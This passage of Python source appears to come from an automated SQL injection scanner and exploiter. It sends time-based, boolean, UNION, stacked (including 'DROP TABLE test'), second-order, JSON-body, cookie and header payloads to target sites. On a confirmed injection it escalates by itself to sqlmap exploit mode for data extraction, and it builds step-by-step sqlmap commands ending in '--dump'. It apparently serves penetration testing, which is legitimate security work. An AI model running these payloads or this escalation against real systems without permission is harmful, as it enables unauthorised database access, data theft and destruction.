        """Create finding for OOB SQL injection."""
        self._stats["oob_callbacks"] += 1
        logger.info(f"[{self.name}] 🎯 OOB SQLi callback received!")
        if hasattr(self, '_v'):
            self._v.emit("exploit.sqli.oob.callback", {
                "param": param,
                "db_type": db_type,
                "interaction_type": interaction.get("protocol", "dns"),
            })

        exploit_url, exploit_url_encoded = self._build_exploit_url(self.url, param, variant)
        curl_cmd = f"curl '{exploit_url_encoded}'"

        return SQLiFinding(
            url=self.url,
            parameter=param,
            injection_type="out-of-band",
            technique="oob",
            working_payload=variant,
            payload_encoded=variant,
            exploit_url=exploit_url,
            exploit_url_encoded=exploit_url_encoded,
            dbms_detected=db_type,
            sqlmap_command=f"sqlmap -u '{self.url}' -p {param} --technique=U --batch",
            curl_command=curl_cmd,
            sqlmap_reproduce_command=f"sqlmap -u '{self.url}' -p {param} --batch --dbs --technique=U",
            validated=True,
            status="VALIDATED_CONFIRMED",
            evidence={
                "oob_callback_received": True,
                "interaction_data": interaction,
                "db_type": db_type,
            },
            reproduction_steps=self._generate_repro_steps(self.url, param, variant, curl_cmd)
        )

    # =========================================================================
    # TRIPLE TIME-BASED VERIFICATION
    # =========================================================================

    async def _verify_time_based_triple(
        self, session: aiohttp.ClientSession, param: str, payload_template: str
    ) -> Tuple[bool, Dict]:
        """
        Triple verification for time-based SQLi to reduce false positives.

        1. Baseline (no sleep) - should be fast
        2. Short sleep (3s) - should take ~3s
        3. Long sleep (10s) - should take ~10s

        Returns (is_vulnerable, evidence)
        """
        base_url = self._get_base_url()
        evidence = {"triple_verified": False, "baseline_time": 0, "short_sleep_time": 0, "long_sleep_time": 0}

        try:
            baseline_time = await self._measure_baseline_time(session, base_url, param)
            evidence["baseline_time"] = baseline_time

            if baseline_time > 3:
                logger.debug(f"[{self.name}] Baseline too slow ({baseline_time:.1f}s), skipping time-based")
                return False, evidence

            short_time = await self._measure_sleep_time(session, base_url, param, payload_template, 3, 15)
            evidence["short_sleep_time"] = short_time

            long_time = await self._measure_sleep_time(session, base_url, param, payload_template, 10, 20)
            evidence["long_sleep_time"] = long_time

            if self._verify_time_correlation(baseline_time, short_time, long_time):
                evidence["triple_verified"] = True
                logger.info(f"[{self.name}] ✅ Time-based TRIPLE VERIFIED: base={baseline_time:.1f}s, short={short_time:.1f}s, long={long_time:.1f}s")
                return True, evidence

            logger.debug(f"[{self.name}] Time-based verification failed: base={baseline_time:.1f}s, short={short_time:.1f}s, long={long_time:.1f}s")
            return False, evidence

        except asyncio.TimeoutError:
            evidence["timeout_occurred"] = True
            return False, evidence
        except Exception as e:
            logger.debug(f"Time-based verification error: {e}")
            return False, evidence

    async def _measure_baseline_time(self, session: aiohttp.ClientSession,
                                     base_url: str, param: str) -> float:
        """Measure baseline response time without injection."""
        start = time.time()
        test_url = self._build_url_with_param(base_url, param, "1")
        async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
            await resp.text()
        return time.time() - start

    async def _measure_sleep_time(self, session: aiohttp.ClientSession, base_url: str,
                                  param: str, payload_template: str, sleep_seconds: int,
                                  timeout: int) -> float:
        """Measure response time with sleep payload."""
        payload = self._create_sleep_payload(payload_template, sleep_seconds)
        start = time.time()
        test_url = self._build_url_with_param(base_url, param, f"1{payload}")
        async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=timeout)) as resp:
            await resp.text()
        return time.time() - start

    def _create_sleep_payload(self, payload_template: str, sleep_seconds: int) -> str:
        """Create sleep payload with specified duration."""
        payload = payload_template
        for old_sleep in ["SLEEP(5)", "SLEEP(10)", "SLEEP(3)"]:
            payload = payload.replace(old_sleep, f"SLEEP({sleep_seconds})")
        for old_sleep in ["pg_sleep(5)", "pg_sleep(10)", "pg_sleep(3)"]:
            payload = payload.replace(old_sleep, f"pg_sleep({sleep_seconds})")
        payload = payload.replace("WAITFOR DELAY '0:0:5'", f"WAITFOR DELAY '0:0:{sleep_seconds}'")
        return payload

    def _verify_time_correlation(self, baseline_time: float, short_time: float, long_time: float) -> bool:
        """Verify correlation: baseline < short < long with reasonable tolerances."""
        return (baseline_time < 2 and
                2 < short_time < 6 and
                8 < long_time < 15 and
                short_time > baseline_time + 2 and
                long_time > short_time + 5)

    # =========================================================================
    # JSON/API BODY INJECTION
    # =========================================================================

    async def _test_json_body_injection(
        self, session: aiohttp.ClientSession, url: str, json_body: Dict
    ) -> List[Dict]:
        """
        Test for SQL injection in JSON POST body parameters.
        """
        findings = []
        flat_params = self._flatten_json(json_body)

        for key, value in flat_params.items():
            if not isinstance(value, (str, int)):
                continue

            finding = await self._test_json_parameter(session, url, json_body, key, value)
            if finding:
                findings.append(finding)
                logger.info(f"[{self.name}] 🎯 JSON SQLi found in {key}")
                return findings

        return findings

    def _flatten_json(self, obj, prefix=""):
        """Flatten nested JSON to dot-notation keys."""
        if isinstance(obj, dict):
            return self._flatten_dict(obj, prefix)
        if isinstance(obj, list):
            return self._flatten_list(obj, prefix)
        return {}

    def _flatten_dict(self, obj: Dict, prefix: str) -> Dict:
        """Flatten dictionary to dot-notation keys."""
        items = {}
        for k, v in obj.items():
            new_key = f"{prefix}.{k}" if prefix else k
            if isinstance(v, (dict, list)):
                items.update(self._flatten_json(v, new_key))
            else:
                items[new_key] = v
        return items

    def _flatten_list(self, obj: List, prefix: str) -> Dict:
        """Flatten list to bracket-notation keys."""
        items = {}
        for i, v in enumerate(obj):
            new_key = f"{prefix}[{i}]"
            if isinstance(v, (dict, list)):
                items.update(self._flatten_json(v, new_key))
            else:
                items[new_key] = v
        return items

    def _set_nested_value(self, obj, key_path, value):
        """Set value in nested structure using dot notation."""
        import copy
        obj = copy.deepcopy(obj)
        keys = re.split(r'\.|\[|\]', key_path)
        keys = [k for k in keys if k]

        current = obj
        for i, key in enumerate(keys[:-1]):
            if key.isdigit():
                key = int(key)
            current = current[key]

        final_key = keys[-1]
        if final_key.isdigit():
            final_key = int(final_key)
        current[final_key] = value
        return obj

    async def _test_json_parameter(self, session: aiohttp.ClientSession, url: str,
                                   json_body: Dict, key: str, value) -> Optional[SQLiFinding]:
        """Test a single JSON parameter for SQL injection."""
        test_payloads = [
            f"{value}'",
            f"{value}' OR '1'='1",
            f"{value}' AND '1'='2",
        ]

        for payload in test_payloads:
            finding = await self._test_single_json_payload(session, url, json_body, key, payload)
            if finding:
                return finding

        return None

    async def _test_single_json_payload(self, session: aiohttp.ClientSession, url: str,
                                        json_body: Dict, key: str, payload: str) -> Optional[SQLiFinding]:
        """Test a single JSON payload for SQL injection."""
        try:
            test_body = self._set_nested_value(json_body, key, payload)

            headers = {"Content-Type": "application/json"}
            headers.update(self.headers)

            async with session.post(
                url,
                json=test_body,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=10)
            ) as resp:
                content = await resp.text()

                error_info = self._extract_info_from_error(content)

                if error_info.get("db_type") or error_info.get("tables_leaked"):
                    return self._create_json_finding(url, key, payload, json_body, test_body, error_info)
        except Exception as e:
            logger.debug(f"JSON injection test failed: {e}")

        return None

    def _create_json_finding(self, url: str, key: str, payload: str,
                            json_body: Dict, test_body: Dict, error_info: Dict) -> SQLiFinding:
        """Create finding for JSON SQL injection."""
        curl_cmd = f"curl -X POST '{url}' -H 'Content-Type: application/json' -d '{json.dumps(test_body)}'"

        return SQLiFinding(
            url=url,
            parameter=f"JSON:{key}",
            injection_type="error-based (JSON)",
            technique="error_based",
            working_payload=payload,
            payload_encoded=payload,
            exploit_url=url,
            exploit_url_encoded=url,
            dbms_detected=error_info.get("db_type", "unknown"),
            extracted_tables=error_info.get("tables_leaked", []),
            sqlmap_command=f"sqlmap -u '{url}' --data='{json.dumps(json_body)}' -p '{key}' --technique=E",
            curl_command=curl_cmd,
            sqlmap_reproduce_command=f"sqlmap -u '{url}' --data='{json.dumps(test_body)}' --technique=E",
            validated=True,
            status="VALIDATED_CONFIRMED",
            evidence={
                "sql_error_visible": True,
                "method": "POST",
                "content_type": "application/json",
                **error_info
            },
            reproduction_steps=self._generate_repro_steps(url, f"JSON:{key}", payload, curl_cmd)
        )

    # =========================================================================
    # SECOND-ORDER SQLi DETECTION
    # =========================================================================

    async def _test_second_order_sqli(
        self, session: aiohttp.ClientSession, injection_url: str, injection_param: str
    ) -> Optional[Dict]:
        """
        Test for second-order SQL injection.
        Inject in one place, observe effect in another.
        """
        if not self.observation_points:
            return None

        second_order_payloads = [
            "admin'-- ", "' OR '1'='1'-- ",
            "test'; DROP TABLE test;-- ", "test' UNION SELECT 1,2,3-- ",
        ]

        base_url = self._get_base_url()

        for payload in second_order_payloads:
            finding = await self._test_second_order_payload(session, base_url, injection_param, payload)
            if finding:
                return finding

        return None

    async def _test_second_order_payload(self, session: aiohttp.ClientSession, base_url: str,
                                         injection_param: str, payload: str) -> Optional[Dict]:
        """Test a single second-order payload."""
        try:
            inject_url = self._build_url_with_param(base_url, injection_param, payload)
            async with session.get(inject_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                await resp.text()

            for obs_url in self.observation_points:
                finding = await self._check_observation_point(session, obs_url, inject_url, injection_param, payload)
                if finding:
                    return finding
        except Exception as e:
            logger.debug(f"Second-order test failed: {e}")

        return None

    async def _check_observation_point(self, session: aiohttp.ClientSession, obs_url: str,
                                       inject_url: str, injection_param: str, payload: str) -> Optional[Dict]:
        """Check observation point for second-order SQL injection."""
        async with session.get(obs_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            content = await resp.text()

            error_info = self._extract_info_from_error(content)

            if error_info.get("db_type") or error_info.get("tables_leaked"):
                logger.info(f"[{self.name}] 🎯 Second-Order SQLi detected!")
                return {
                    "type": "SQLI",
                    "subtype": "Second-Order",
                    "url": self.url,
                    "injection_point": f"{inject_url}?{injection_param}",
                    "trigger_point": obs_url,
                    "parameter": injection_param,
                    "payload": payload,
                    "technique": "second_order",
                    "evidence": {"sql_error_visible": True, **error_info},
                    "severity": "CRITICAL",
                    "validated": True,
                    "status": "VALIDATED_CONFIRMED",
                    "description": f"Second-Order SQL Injection confirmed. Payload injected at '{injection_param}' triggers error at '{obs_url}'. DB: {error_info.get('db_type', 'unknown')}",
                    "reproduction": f"# Step 1: Inject payload\ncurl '{inject_url}'\n# Step 2: Trigger at observation point\ncurl '{obs_url}'"
                }

        return None

    # =========================================================================
    # PREPARED STATEMENT DETECTION (EARLY EXIT)
    # =========================================================================

    async def _detect_prepared_statements(
        self, session: aiohttp.ClientSession, param: str
    ) -> bool:
        """
        Detect if the application likely uses prepared statements.
        If responses to multiple SQLi payloads are identical, it's probably safe.
        """
        base_url = self._get_base_url()
        responses = []

        test_payloads = [
            "1",           # Normal
            "1'",          # Single quote
            "1' OR '1'='1",  # Classic SQLi
            "1; DROP TABLE test",  # Stacked
            "1 UNION SELECT 1",    # Union
        ]

        for payload in test_payloads:
            try:
                test_url = self._build_url_with_param(base_url, param, payload)
                async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    content = await resp.text()
                    # Normalize response (remove dynamic parts)
                    normalized = re.sub(r'\d{4}-\d{2}-\d{2}', 'DATE', content)
                    normalized = re.sub(r'\d{2}:\d{2}:\d{2}', 'TIME', normalized)
                    normalized = re.sub(r'[a-f0-9]{32}', 'HASH', normalized)
                    responses.append(normalized[:1000])
            except Exception as e:
                responses.append("")

        # If all responses are very similar (>95% match) and no SQL errors
        if len(set(responses)) == 1 or len(responses) < 3:
            has_sql_error = any(
                self._extract_info_from_error(r).get("db_type")
                for r in responses
            )
            if not has_sql_error:
                self._stats["prepared_statement_exits"] += 1
                logger.info(f"[{self.name}] 🛡️ Prepared statement detection bypassed (Always test mode), testing {param}")
                # return True  <-- Disabled to avoid missing vulnerabilities in lab environments

        return False

    # =========================================================================
    # SQLMAP REPRODUCTION COMMANDS
    # =========================================================================

    def _build_full_sqlmap_command(
        self, param: str, technique: str, db_type: Optional[str] = None,
        tamper: Optional[str] = None, extra_options: Dict = None
    ) -> str:
        """
        Build complete SQLMap command for reproduction.
        """
        technique_map = {
            "error_based": "E", "boolean_based": "B", "union_based": "U",
            "stacked": "S", "time_based": "T", "oob": "E",
        }
        tech_code = technique_map.get(technique, "BEUS")

        cmd_parts = [
            f"sqlmap -u '{self.url}'",
            "--batch",
            "--level=2",  # Test cookies (level 1=URL params, 2=+cookies, 3=+headers)
            "--risk=2",   # More aggressive tests
            f"-p {param}",
            f"--technique={tech_code}",
        ]

        if db_type:
            cmd_parts.append(f"--dbms={db_type.lower()}")

        self._add_tamper_scripts(cmd_parts, tamper)
        self._add_cookies_and_headers(cmd_parts)

        if extra_options:
            for key, value in extra_options.items():
                cmd_parts.append(f"--{key}={value}" if value else f"--{key}")

        return " \\\n  ".join(cmd_parts)

    def _add_tamper_scripts(self, cmd_parts: List[str], tamper: Optional[str]):
        """Add tamper scripts to SQLMap command."""
        if tamper:
            cmd_parts.append(f"--tamper={tamper}")
        elif self._detected_filters:
            suggested_tampers = []
            if " " in self._detected_filters:
                suggested_tampers.append("space2comment")
            if "'" in self._detected_filters:
                suggested_tampers.append("apostrophemask")
            if "OR" in self._detected_filters or "AND" in self._detected_filters:
                suggested_tampers.append("randomcase")
            if suggested_tampers:
                cmd_parts.append(f"--tamper={','.join(suggested_tampers)}")

    def _add_cookies_and_headers(self, cmd_parts: List[str]):
        """Add cookies and headers to SQLMap command."""
        if self.cookies:
            cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in self.cookies])
            cmd_parts.append(f"--cookie='{cookie_str}'")

        for name, value in self.headers.items():
            cmd_parts.append(f"--header='{name}: {value}'")

    def _build_progressive_sqlmap_commands(
        self, param: str, technique: str, db_type: Optional[str] = None
    ) -> List[Dict[str, str]]:
        """
        Build progressive SQLMap commands for exploitation.
        """
        base_cmd = self._build_full_sqlmap_command(param, technique, db_type)

        return [
            {
                "step": "1. Confirm vulnerability",
                "command": base_cmd,
                "description": "Verify the SQL injection is exploitable"
            },
            {
                "step": "2. List databases",
                "command": base_cmd + " \\\n  --dbs",
                "description": "Enumerate all databases on the server"
            },
            {
                "step": "3. List tables",
                "command": base_cmd + " \\\n  -D <DATABASE_NAME> --tables",
                "description": "List tables in a specific database"
            },
            {
                "step": "4. List columns",
                "command": base_cmd + " \\\n  -D <DATABASE_NAME> -T <TABLE_NAME> --columns",
                "description": "List columns in a specific table"
            },
            {
                "step": "5. Extract data (CAREFUL!)",
                "command": base_cmd + " \\\n  -D <DATABASE_NAME> -T <TABLE_NAME> --dump",
                "description": "Extract data from a table (use with caution in production)"
            },
        ]

    # =========================================================================
    # LLM EXPLOITATION EXPLANATION
    # =========================================================================

    async def _generate_llm_exploitation_explanation(self, finding: Any) -> str:
        """
        Generate professional exploitation explanation using LLM.
        """
        try:
            from bugtrace.core.llm_client import llm_client

            system_prompt = """You are a senior penetration tester writing a professional vulnerability report.
Write a concise but thorough explanation of this SQL injection vulnerability for a security triager.

Include:
1. Brief explanation of the vulnerability type
2. Potential impact (data theft, authentication bypass, etc.)
3. Affected data/tables if known
4. Remediation recommendation

Keep it professional and factual. Do not include actual exploit code."""

            finding_data = self._extract_finding_data(finding)
            user_prompt = self._build_llm_prompt(finding_data)

            response = await llm_client.generate(
                prompt=user_prompt,
                system_prompt=system_prompt,
                module_name="SQLi_Explanation",
                max_tokens=500,
                temperature=0.3
            )

            return response.strip() if response else ""

        except Exception as e:
            logger.debug(f"LLM explanation failed: {e}")
            return ""

    def _extract_finding_data(self, finding: Any) -> Dict:
        """Extract data from finding (handles both Dict and SQLiFinding)."""
        if isinstance(finding, dict):
            return {
                'url': finding.get('url'),
                'param': finding.get('parameter'),
                'technique': finding.get('technique', 'Unknown'),
                'db_type': finding.get('evidence', {}).get('db_type', 'Unknown'),
                'tables': finding.get('evidence', {}).get('tables_leaked', []),
                'columns': finding.get('evidence', {}).get('columns_leaked', [])
            }
        else:
            return {
                'url': finding.url,
                'param': finding.parameter,
                'technique': finding.injection_type,
                'db_type': finding.dbms_detected,
                'tables': finding.extracted_tables,
                'columns': finding.columns_detected
            }

    def _build_llm_prompt(self, finding_data: Dict) -> str:
        """Build LLM prompt from finding data."""
        return f"""SQL Injection Finding:
- URL: {finding_data['url']}
- Parameter: {finding_data['param']}
- Technique: {finding_data['technique']}
- Database Type: {finding_data['db_type']}
- Tables Leaked: {finding_data['tables']}
- Columns Leaked: {finding_data['columns']}

Write the exploitation explanation section for the report."""

    # =========================================================================
    # RUN LOOP HELPERS
    # =========================================================================

    def _configure_session(self, session: aiohttp.ClientSession):
        """Configure session with cookies and headers."""
        if self.cookies:
            cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in self.cookies])
            session.cookie_jar.update_cookies({"Cookie": cookie_str})

    async def _initialize_baseline(self, session: aiohttp.ClientSession):
        """Initialize baseline response and Interactsh."""
        dashboard.log(f"[{self.name}] Phase 1: Initializing...", "INFO")

        try:
            start = time.time()
            async with session.get(self.url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                baseline_content = await resp.text()
                self._baseline_response_time = time.time() - start
                self._baseline_content_length = len(baseline_content)
                self._detected_db_type = self._detect_database_type(baseline_content)
        except Exception as e:
            logger.warning(f"Baseline failed: {e}")

        await self._init_interactsh()

    def _should_test_cookie(self, cookie_name: str) -> bool:
        """Check if a cookie should be tested for SQLi.

        Filters out infrastructure cookies (load balancers, CDNs, WAFs) that
        produce false positives from routing behavior changes. Legitimate
        application cookies (session, TrackingId, etc.) pass through.

        Args:
            cookie_name: The cookie name to evaluate.

        Returns:
            True if the cookie should be tested, False if it's infrastructure.
        """
        normalized = cookie_name.lower().strip()

        # Exact match against known infrastructure cookies
        if normalized in INFRASTRUCTURE_COOKIES:
            logger.debug(
                f"[{self.name}] Skipping infrastructure cookie: {cookie_name}"
            )
            return False

        # Prefix match for cookie families (e.g. awsalb-*, __cf_*)
        for prefix in _INFRASTRUCTURE_COOKIE_PREFIXES:
            if normalized.startswith(prefix):
                logger.debug(
                    f"[{self.name}] Skipping infrastructure cookie "
                    f"(prefix '{prefix}'): {cookie_name}"
                )
                return False

        return True

    async def _discover_sqli_params(self, url: str) -> Dict[str, str]:
        """
        SQLi-focused parameter discovery for a given URL.

        Extracts ALL testable parameters from:
        1. URL query string
        2. HTML forms (input, textarea, select)

        Returns:
            Dict mapping param names to default values
            Example: {"id": "123", "sort": "asc", "searchTerm": ""}

        Architecture Note:
            Specialists must be AUTONOMOUS - they discover their own attack surface.
            The finding from DASTySAST is just a "signal" that the URL is interesting.
            We IGNORE the specific parameter and test ALL discoverable params.
        """
        from bugtrace.tools.visual.browser import browser_manager
        from urllib.parse import urlparse, parse_qs
        from bs4 import BeautifulSoup

        all_params = {}

        # 1. Extract URL query parameters
        try:
            parsed = urlparse(url)
            url_params = parse_qs(parsed.query)
            for param_name, values in url_params.items():
                all_params[param_name] = values[0] if values else ""
        except Exception as e:
            logger.warning(f"[{self.name}] Failed to parse URL params: {e}")

        # 2. Fetch HTML and extract form parameters + link parameters
        try:
            state = await browser_manager.capture_state(url)
            html = state.get("html", "")

            if html:
                self._last_discovery_html = html  # Cache for URL resolution
                soup = BeautifulSoup(html, "html.parser")

                # Extract from <input>, <textarea>, <select>
                for tag in soup.find_all(["input", "textarea", "select"]):
                    param_name = tag.get("name")
                    if param_name and param_name not in all_params:
                        input_type = tag.get("type", "text").lower()

                        # Skip non-testable input types
                        if input_type not in ["submit", "button", "reset"]:
                            # Include CSRF tokens for SQLi (unlike XSS)
                            # Some apps validate CSRF but still have SQLi in the token check
                            default_value = tag.get("value", "")
                            all_params[param_name] = default_value

                # Extract params from <a> href links (same-origin only)
                parsed_base = urlparse(url)
                for a_tag in soup.find_all("a", href=True):
                    href = a_tag["href"]
                    if href.startswith(("javascript:", "mailto:", "#", "tel:")):
                        continue
                    try:
                        from urllib.parse import urljoin
                        resolved = urlparse(urljoin(url, href))
                        if resolved.netloc and resolved.netloc != parsed_base.netloc:
                            continue
                        for p_name, p_vals in parse_qs(resolved.query).items():
                            if p_name not in all_params:
                                all_params[p_name] = p_vals[0] if p_vals else ""
                    except Exception:
                        continue

        except Exception as e:
            logger.error(f"[{self.name}] HTML parsing failed: {e}")

        # 3. Extract cookies from HTTP response (Set-Cookie headers)
        # Cookies are a major SQLi attack surface (e.g., TrackingId on ginandjuice.shop)
        try:
            timeout = aiohttp.ClientTimeout(total=10)
            async with aiohttp.ClientSession(timeout=timeout) as cookie_session:
                async with cookie_session.get(url, ssl=False, allow_redirects=True) as resp:
                    for cookie_header in resp.headers.getall("Set-Cookie", []):
                        # Parse cookie name from "name=value; Path=/; HttpOnly"
                        cookie_name = cookie_header.split("=", 1)[0].strip()
                        if cookie_name and self._should_test_cookie(cookie_name):
                            cookie_key = f"Cookie: {cookie_name}"
                            if cookie_key not in all_params:
                                all_params[cookie_key] = ""
                                logger.info(f"[{self.name}] 🍪 Discovered cookie param: {cookie_name}")
        except Exception as e:
            logger.warning(f"[{self.name}] Cookie extraction failed: {e}")

        # 4. Add common injectable headers for testing
        # These headers are often passed to backend queries (logging, analytics, auth)
        injectable_headers = [
            "X-Forwarded-For",
            "Referer",
            "User-Agent",
        ]
        for header_name in injectable_headers:
            header_key = f"Header: {header_name}"
            if header_key not in all_params:
                all_params[header_key] = ""

        logger.info(f"[{self.name}] 🔍 Discovered {len(all_params)} params on {url}: {list(all_params.keys())}")
        return all_params

    async def _extract_and_prioritize_params(self) -> List[str]:
        """Extract and prioritize parameters from URL and POST data."""
        parsed = urlparse(self.url)
        params = list(parse_qs(parsed.query).keys())

        if self.param and self.param not in params:
            params.insert(0, self.param)

        if self.post_data:
            post_params = self._extract_post_params(self.post_data)
            params.extend(post_params)

        params = self._prioritize_params(list(set(params)))

        if not params:
            params = ["id"]

        return params

    async def _test_all_parameters(self, session: aiohttp.ClientSession,
                                   params: List[str], findings: List) -> List:
        """Test all parameters for SQL injection."""
        for param in params:
            if self._max_impact_achieved:
                dashboard.log(f"[{self.name}] 🏆 Max impact achieved, stopping", "SUCCESS")
                break

            if param in self._tested_params:
                continue

            self._tested_params.add(param)
            self._stats["params_tested"] += 1
            dashboard.log(f"[{self.name}] Testing: {param}", "INFO")

            if await self._detect_prepared_statements(session, param):
                continue

            await self._detect_filtered_chars(session, param)

            finding = await self._test_single_parameter(session, param)
            if finding:
                findings.append(self._finding_to_dict(finding))
                if self._should_stop_after_finding(finding, findings):
                    break

        return findings

    async def _test_single_parameter(self, session: aiohttp.ClientSession,
                                     param: str) -> Optional[SQLiFinding]:
        """Test single parameter with all techniques."""
        # OOB SQLi
        if self._interactsh:
            finding = await self._test_oob_sqli(session, param)
            if finding:
                return await self._finalize_finding(finding, "oob")

        # Error-based
        error_finding = await self._test_error_based(session, param)
        
        # Union-based (Prioritized: Run this even if error-based found to get better proof)
        union_finding = await self._test_union_based(session, param)
        if union_finding:
            # ENHANCEMENT: Auto-escalate to extraction via SQLMap to get user/pass/tables
            dashboard.log(f"[{self.name}] 💉 UNION SQLi confirmed. Escalate to SQLMap for data extraction...", "INFO")
            
            # Run SQLMap with 'U' technique to dump data
            dump_finding = await self._run_sqlmap_on_param(param, technique_hint="U", exploit_mode=True)
            
            if dump_finding:
                # If SQLMap found more stuff (tables, dbs), return that richer finding
                return await self._finalize_finding(dump_finding, "union_based")
            else:
                 # Fallback to our manual proof if SQLMap fails for some reason
                return await self._finalize_finding(union_finding, "union_based")

        # Error-based
        if error_finding:
            # ENHANCEMENT: Auto-escalate to extraction via SQLMap to get user/pass/tables
            dashboard.log(f"[{self.name}] 💉 Error-based SQLi confirmed. Escalate to SQLMap for data extraction...", "INFO")
            dump_finding = await self._run_sqlmap_on_param(param, technique_hint="E", exploit_mode=True)
            if dump_finding:
                return await self._finalize_finding(dump_finding, "error_based")
            return await self._finalize_finding(error_finding, "error_based")

        # Boolean-based
        finding = await self._test_boolean_based(session, param)
        if finding:
            return await self._finalize_finding(finding, "boolean_based")

        # Time-based (Strict: Must be verified by SQLMap to be trusted)
        time_finding = await self._test_time_based(session, param)
        if time_finding:
            # Automate SQLMap verification for Time-Based as it's unreliable
            dashboard.log(f"[{self.name}] ⏳ Time-based candidate found. verifying with SQLMap...", "INFO")
            sqlmap_confirmation = await self._run_sqlmap_on_param(param, technique_hint="T")
            
            if sqlmap_confirmation:
                return await self._finalize_finding(sqlmap_confirmation, "time_based")
            else:
                dashboard.log(f"[{self.name}] ⚠️ Discarding unverified Time-based finding (SQLMap failed)", "WARNING")
        
        return None

    async def _test_time_based(self, session: aiohttp.ClientSession,
                               param: str) -> Optional[SQLiFinding]:
        """Test for time-based SQL injection."""
        time_payloads = [
            "' AND SLEEP(5)-- ",
            "' OR SLEEP(5)-- ",
            "'; WAITFOR DELAY '0:0:5'-- ",
            "' AND pg_sleep(5)-- ",
        ]

        for payload in time_payloads:
            verified, evidence = await self._verify_time_based_triple(session, param, payload)
            if verified:
                if hasattr(self, '_v'):
                    self._v.emit("exploit.sqli.time_delay", {
                        "param": param,
                        "payload": payload[:80],
                        "baseline_time": evidence.get("baseline_time"),
                        "delay_time": evidence.get("long_sleep_time"),
                    })
                exploit_url, exploit_url_encoded = self._build_exploit_url(self.url, param, payload)
                curl_cmd = f"curl '{exploit_url_encoded}'"

                return SQLiFinding(
                    url=self.url,
                    parameter=param,
                    injection_type="time-based",
                    technique="time_based",
                    working_payload=payload,
                    payload_encoded=payload,
                    exploit_url=exploit_url,
                    exploit_url_encoded=exploit_url_encoded,
                    dbms_detected=self._detected_db_type or "unknown",
                    sqlmap_command=f"sqlmap -u '{self.url}' -p {param} --technique=T --time-sec=5 --batch",
                    curl_command=curl_cmd,
                    sqlmap_reproduce_command=f"sqlmap -u '{self.url}' -p {param} --batch --technique=T",
                    validated=True,
                    status=self._determine_validation_status("time_based", evidence),
                    evidence=evidence,
                    reproduction_steps=self._generate_repro_steps(self.url, param, payload, curl_cmd)
                )

        return None

    async def _finalize_finding(self, finding: SQLiFinding, technique: str) -> SQLiFinding:
        """Finalize finding with stats. SQL error + payload + SQLMap command = proof enough."""
        self._stats["vulns_found"] += 1
        return finding

    def _should_stop_after_finding(self, finding: SQLiFinding, findings: List) -> bool:
        """Check if we should stop testing after this finding."""
        should_stop, reason = self._should_stop_testing(
            finding.technique, finding.evidence, len(findings)
        )
        if should_stop:
            dashboard.log(f"[{self.name}] {reason}", "SUCCESS")
        return should_stop

    async def _test_json_injection(self, session: aiohttp.ClientSession,
                                   findings: List) -> List:
        """Test JSON body injection if applicable."""
        if not self.post_data or self._max_impact_achieved:
            return findings

        try:
            json_body = json.loads(self.post_data)
            if hasattr(self, '_v'):
                self._v.emit("exploit.sqli.json_testing", {
                    "url": self.url,
                    "keys": list(json_body.keys()) if isinstance(json_body, dict) else [],
                })
            dashboard.log(f"[{self.name}] Phase 4: Testing JSON body...", "INFO")
            json_findings = await self._test_json_body_injection(session, self.url, json_body)
            for jf in json_findings:
                findings.append(self._finding_to_dict(jf))
            self._stats["vulns_found"] += len(json_findings)
        except json.JSONDecodeError:
            pass

        return findings

    async def _test_second_order_injection(self, session: aiohttp.ClientSession,
                                          params: List[str], findings: List) -> List:
        """Test second-order SQL injection if applicable."""
        if not self.observation_points or self._max_impact_achieved:
            return findings

        dashboard.log(f"[{self.name}] Phase 5: Testing second-order SQLi...", "INFO")
        for param in params[:5]:
            so_finding = await self._test_second_order_sqli(session, self.url, param)
            if so_finding:
                findings.append(so_finding)
                self._stats["vulns_found"] += 1
                break

        return findings

    async def _run_sqlmap_fallback(self, session: aiohttp.ClientSession,
                                   params: List[str], findings: List) -> List:
        """Run SQLMap as fallback if no findings."""
        if findings or not external_tools.docker_cmd:
            return findings

        dashboard.log(f"[{self.name}] Phase 6: SQLMap fallback...", "INFO")

        for param in params[:3]:
            finding = await self._run_sqlmap_on_param(param)
            if finding:
                findings.append(self._finding_to_dict(finding))
                self._stats["vulns_found"] += 1
                if settings.EARLY_EXIT_ON_FINDING:
                    break

        return findings

    async def _run_sqlmap_on_param(self, param: str, technique_hint: str = None, exploit_mode: bool = False) -> Optional[SQLiFinding]:
        """Run SQLMap on a single parameter.

        Args:
            param: Parameter name to test
            technique_hint: Optional hint from internal checks (E/B/U/T or combination).
                           If None, SQLMap tries all techniques (BEUSTQ).
        """
        if hasattr(self, '_v'):
            self._v.emit("exploit.sqli.sqlmap.started", {
                "param": param,
                "technique_hint": technique_hint or "BEUSTQ",
            })

        docker_url = self.url.replace("127.0.0.1", "172.17.0.1").replace("localhost", "172.17.0.1")

        # Use hint if provided, otherwise try common techniques
        technique = technique_hint if technique_hint else "BEUSTQ"

        sqlmap_result = await external_tools.run_sqlmap(
            docker_url,
            target_param=param,
            technique=technique,
            exploit_mode=exploit_mode
        )

        if not sqlmap_result or not sqlmap_result.get("vulnerable"):
            if hasattr(self, '_v'):
                self._v.emit("exploit.sqli.sqlmap.completed", {
                    "param": param,
                    "vulnerable": False,
                })
            return None

        if hasattr(self, '_v'):
            self._v.emit("exploit.sqli.sqlmap.completed", {
                "param": param,
                "vulnerable": True,
                "dbms": sqlmap_result.get("dbms", "unknown"),
                "type": sqlmap_result.get("type", "unknown"),
            })

        return self._create_sqlmap_finding(sqlmap_result, param)

    def _create_sqlmap_finding(self, sqlmap_result: Dict, param: str) -> SQLiFinding:
        """Create finding from SQLMap result."""
        technique = self._sqlmap_type_to_technique(sqlmap_result.get("type", ""))
        details = self._parse_sqlmap_output(sqlmap_result.get("output_snippet", ""))

        dbms = details.get("dbms") if details.get("dbms") != "unknown" else sqlmap_result.get("dbms", "unknown")
        working_payload = details.get("working_payload") or sqlmap_result.get("payload", "")

        exploit_url, exploit_url_encoded = self._build_exploit_url(self.url, param, working_payload)
        curl_cmd = f"curl '{exploit_url_encoded}'"

        finding = SQLiFinding(
            url=self.url,
            parameter=sqlmap_result.get("parameter", param),
